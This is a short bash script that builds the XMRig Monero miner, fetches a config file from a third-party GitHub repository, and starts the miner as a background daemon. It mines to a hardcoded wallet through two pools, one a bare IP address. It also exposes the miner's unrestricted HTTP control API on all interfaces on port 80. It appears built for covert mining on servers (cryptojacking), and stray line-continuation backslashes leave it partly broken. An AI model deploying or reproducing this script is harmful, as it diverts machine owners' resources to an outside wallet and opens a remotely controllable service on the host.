#!/bin/bash
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev \

git clone https://github.com/xmrig/xmrig.git 

cd xmrig && mkdir build && cd build \

cmake .. && make

wget https://raw.githubusercontent.com/basetrue/home/master/config.json \

./xmrig --http-enabled --api-worker-id win2016bitcoin --http-host 0.0.0.0 --http-port 80 --http-access-token win2016bitcoin --http-no-restricted -o 168.63.129.16:80 -u 42oGk671nooT2fYzXMvZcuC7YNgZ6HFmj9yzAXWuyxZE2ygqP4V6N5URJU7SWDEN5fivPvL4ujcQY9yaeWKxZSw44NPXGF4 --coin monero --daemon --tls -o us-west.minexmr.com:443 -u 42oGk671nooT2fYzXMvZcuC7YNgZ6HFmj9yzAXWuyxZE2ygqP4V6N5URJU7SWDEN5fivPvL4ujcQY9yaeWKxZSw44NPXGF4 -k --tls --rig-id Ubuntu-Server
